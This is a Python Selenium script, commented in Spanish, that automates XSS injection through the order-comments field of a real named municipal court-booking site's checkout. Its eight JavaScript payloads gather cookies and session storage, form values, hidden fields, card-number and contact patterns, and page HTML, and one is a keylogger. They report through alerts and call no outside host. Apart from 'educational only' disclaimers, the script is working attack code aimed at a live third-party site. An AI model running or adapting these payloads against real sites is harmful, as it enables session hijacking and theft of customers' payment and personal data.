from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def configurar_driver():
    chrome_options = Options()
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--allow-running-insecure-content")
    chrome_options.add_argument("--window-size=1280,720")
    driver = webdriver.Chrome(options=chrome_options)
    return driver

# Payloads para extraer datos sensibles
payloads_extraccion = {
    "1. Cookies y sesiones": """<script>
        var datos = 'COOKIES: ' + document.cookie + '\\n';
        datos += 'SESSION: ' + JSON.stringify(sessionStorage) + '\\n';
        datos += 'LOCAL: ' + JSON.stringify(localStorage);
        alert(datos);
    </script>""",
    
    "2. Formularios y campos": """<script>
        var campos = '';
        var formularios = document.forms;
        for(var i=0; i<formularios.length; i++){
            var form = formularios[i];
            campos += 'FORM ' + i + ':\\n';
            for(var j=0; j<form.elements.length; j++){
                var campo = form.elements[j];
                if(campo.value) campos += campo.name + ': ' + campo.value + '\\n';
            }
        }
        alert('DATOS FORMULARIOS:\\n' + campos);
    </script>""",
    
    "3. Buscar numeros de tarjeta": """<script>
        var texto = document.body.innerText;
        var numeros = texto.match(/\\b(?:\\d{4}[\\s-]?){3}\\d{4}\\b/g);
        var tarjetas = numeros ? numeros.join('\\n') : 'No se encontraron patrones de tarjetas';
        alert('POSIBLES TARJETAS:\\n' + tarjetas);
    </script>""",
    
    "4. Datos de campos ocultos": """<script>
        var ocultos = document.querySelectorAll('input[type="hidden"]');
        var datos = 'CAMPOS OCULTOS:\\n';
        for(var i=0; i<ocultos.length; i++){
            datos += ocultos[i].name + ': ' + ocultos[i].value + '\\n';
        }
        alert(datos);
    </script>""",
    
    "5. Información del navegador": """<script>
        var info = 'NAVEGADOR: ' + navigator.userAgent + '\\n';
        info += 'IDIOMA: ' + navigator.language + '\\n';
        info += 'PLATAFORMA: ' + navigator.platform + '\\n';
        info += 'URL: ' + window.location.href + '\\n';
        info += 'REFERRER: ' + document.referrer;
        alert(info);
    </script>""",
    
    "6. Buscar datos personales": """<script>
        var texto = document.body.innerText;
        var emails = texto.match(/\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b/g);
        var telefonos = texto.match(/\\b(?:\\+34|34)?[6-9]\\d{8}\\b/g);
        var datos = 'EMAILS: ' + (emails ? emails.join(', ') : 'Ninguno') + '\\n';
        datos += 'TELEFONOS: ' + (telefonos ? telefonos.join(', ') : 'Ninguno');
        alert(datos);
    </script>""",
    
    "7. Keylogger simple": """<script>
        var teclas = '';
        document.addEventListener('keydown', function(e) {
            teclas += e.key;
            if(teclas.length > 50) {
                alert('TECLAS CAPTURADAS: ' + teclas);
                teclas = '';
            }
        });
        alert('Keylogger activado. Escribe algo...');
    </script>""",
    
    "8. Exfiltrar HTML completo": """<script>
        var html = document.documentElement.outerHTML;
        var fragmento = html.substring(0, 500);
        alert('HTML (primeros 500 chars):\\n' + fragmento);
    </script>"""
}

def probar_extraccion():
    print("="*60)
    print("🚨 EXTRACCIÓN DE DATOS VIA XSS - SOLO FINES EDUCATIVOS 🚨")
    print("="*60)
    
    driver = configurar_driver()
    
    try:
        print("1. Navegando a la página...")
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")
        time.sleep(3)
        
        print("\nRECUERDA:")
        print("- Esto es solo para aprendizaje")
        print("- Asegúrate de tener una reserva en el carrito")
        print("- Nunca uses esto en sitios reales sin permiso")
        
        input("\nCuando tengas algo en el carrito, presiona Enter...")
        
        print("\nPayloads disponibles:")
        for key, value in payloads_extraccion.items():
            print(f"{key}")
        
        while True:
            try:
                opcion = input("\nElige payload (1-8) o 'q' para salir: ")
                
                if opcion.lower() == 'q':
                    break
                
                if opcion in ['1', '2', '3', '4', '5', '6', '7', '8']:
                    payload_key = list(payloads_extraccion.keys())[int(opcion)-1]
                    payload = payloads_extraccion[payload_key]
                    
                    print(f"\nUsando: {payload_key}")
                    
                    # Ve a finalizar compra
                    driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
                    time.sleep(3)
                    
                    wait = WebDriverWait(driver, 10)
                    campo_notas = wait.until(EC.presence_of_element_located((By.NAME, "order_comments")))
                    
                    # Rellena campos básicos
                    driver.find_element(By.NAME, "billing_first_name").clear()
                    driver.find_element(By.NAME, "billing_first_name").send_keys("Test")
                    
                    driver.find_element(By.NAME, "billing_last_name").clear()
                    driver.find_element(By.NAME, "billing_last_name").send_keys("Extract")
                    
                    driver.find_element(By.NAME, "billing_phone").clear()
                    driver.find_element(By.NAME, "billing_phone").send_keys("123456789")
                    
                    driver.find_element(By.NAME, "billing_email").clear()
                    driver.find_element(By.NAME, "billing_email").send_keys("test@example.com")
                    
                    # Inyecta el payload
                    campo_notas.clear()
                    campo_notas.send_keys(payload)
                    
                    print("Payload inyectado!")
                    
                    # Marca términos
                    try:
                        driver.find_element(By.NAME, "terms").click()
                    except:
                        pass
                    
                    input("Presiona Enter para ejecutar el payload...")
                    
                    # Envía formulario
                    try:
                        driver.find_element(By.ID, "place_order").click()
                        print("¡Payload ejecutado! Observa las alertas...")
                        time.sleep(5)
                    except:
                        print("Envía manualmente el formulario")
                        input("Presiona Enter cuando veas el resultado...")
                
                else:
                    print("Opción no válida")
                    
            except Exception as e:
                print(f"Error: {e}")
                
    except Exception as e:
        print(f"Error general: {e}")
    
    input("\nPresiona Enter para cerrar...")
    driver.quit()

if __name__ == "__main__":
    print("⚠️  ADVERTENCIA: Solo usar con fines educativos")
    print("⚠️  No usar en sitios reales sin autorización")
    
    confirmacion = input("\n¿Confirmas que esto es solo para aprendizaje? (si/no): ")
    
    if confirmacion.lower() in ['si', 's', 'yes', 'y']:
        probar_extraccion()
    else:
        print("Operación cancelada.")
